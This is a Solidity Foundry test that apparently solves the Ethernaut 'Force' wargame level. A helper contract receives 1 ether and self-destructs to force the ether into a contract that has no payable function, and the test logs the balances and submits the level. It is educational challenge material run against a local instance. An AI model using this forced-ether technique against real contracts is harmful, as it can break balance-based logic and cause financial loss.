// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/07-Force/ForceFactory.sol";
import "../src/Ethernaut.sol";

// https://docs.soliditylang.org/en/v0.8.13/introduction-to-smart-contracts.html#deactivate-and-self-destruct
contract ForceBalance {
    address public _contract;

    constructor (address _force) {
        _contract = _force;
    }

    function deleteToForceBalance () external {
        selfdestruct(payable(_contract));
    }

    receive() external payable {}
}

contract ForceTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testForce() public {
        // Level setup
        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));

        // Level attack
        emit log_named_uint("Force balance pre attack", address(ethernautForce).balance);
        ForceBalance attack = new ForceBalance(levelAddress);
        (bool success, ) = address(attack).call{value: 1 ether}("");
        assertTrue(success);
        attack.deleteToForceBalance();
        emit log_named_uint("Force balance post attack", address(ethernautForce).balance);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
